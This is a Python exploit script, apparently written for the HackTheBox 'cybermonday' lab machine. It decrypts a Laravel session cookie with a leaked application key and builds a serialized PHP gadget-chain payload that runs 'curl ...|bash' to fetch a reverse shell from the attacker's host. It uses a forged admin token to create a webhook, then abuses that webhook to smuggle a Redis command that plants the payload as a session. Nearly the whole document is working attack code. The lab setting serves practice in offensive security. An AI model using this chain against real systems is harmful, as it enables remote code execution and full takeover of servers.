#!/usr/bin/env python3

from Crypto.Cipher import AES
from urllib.parse import quote,unquote
import json
import hashlib
import hmac
import base64
import requests
import requests
import re
import string
import random

# both mcrypt_decrypt and decrypt functions gotten from a script on hacktricks, so credits to them
# modified the functions a bit to fit my script
def mcrypt_decrypt(value, iv, key):
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)

def decrypt(session_cookie, key):
    dic = json.loads(base64.b64decode(session_cookie).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv), key)
    return ''

def create_session():
  s = requests.Session()
  return s

def get_cookie():
  r1 = s.get("http://cybermonday.htb/")
  cookie = unquote(s.cookies['cybermonday_session'])
  return cookie

def decrypt_cookie():
  # decrypt the cybermonday_session cookie and prepare the payload
  app_key = 'EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=' # found in .env
  key = base64.b64decode(app_key)
  session = str(decrypt(str(cookie),key)).split("|")[1].split("\\x")[0]
  # phpggc -f -a Laravel/RCE16 system "curl <HOST>:<PORT>/revshell.sh|bash", make sure to manually escape \x00 in the payload
  payload='a:2:{i:7;O:35:"Monolog\Handler\RotatingFileHandler":4:{S:13:"\\00*\\00mustRotate";b:1;S:11:"\\00*\\00filename";S:8:"anything";S:17:"\\00*\\00filenameFormat";O:38:"Illuminate\Validation\Rules\RequiredIf":1:{S:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{S:11:"\\00*\\00callback";S:14:"call_user_func";S:10:"\\00*\\00request";S:6:"system";S:11:"\\00*\\00provider";S:33:"curl 10.10.14.103:8000/pwned|bash";}i:1;S:4:"user";}}S:13:"\\00*\\00dateFormat";S:1:"l";}i:7;i:7;}'
  return session, payload

def create_webhook():
  admin_token="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.hsjDWoGJbgx_ygJe9nlfu4dNZHUZuF3Igy43NfKQ7aE" # ability to create webhooks with action=sendRequest
  headers = {"Content-Type": "application/json", "x-access-token": admin_token}
  # create webhook
  data = {"name": "pwned" + str("".join(random.choices(string.digits, k=10))), "description": "pwned", "action": "sendRequest"}
  response = requests.post('http://webhooks-api-beta.cybermonday.htb/webhooks/create', headers=headers, data=json.dumps(data))
  uuid = json.loads(response.text)['webhook_uuid']
  return uuid, headers

def send_payload():
  data = {"url": "http://redis:6379", "method": "SET laravel_session:" + session + " '" + payload + "'\r\n"}
  r = requests.post('http://webhooks-api-beta.cybermonday.htb/webhooks/' + str(uuid), headers=headers, data=json.dumps(data))

def execute_payload():
  s.get('http://cybermonday.htb/')

if __name__ == "__main__":
  print("[!] Remember to start a listener!")
  s = create_session() 
  print("[+] Getting the cookie and decrypting it...")
  cookie = get_cookie()
  session,payload = decrypt_cookie()
  print("[+] Creating webhook...")
  uuid,headers = create_webhook()
  print("[+] Sending the payload...")
  send_payload()
  print("[+] Executing the payload! If this hangs, you've got a shell, enjoy!")
  execute_payload()
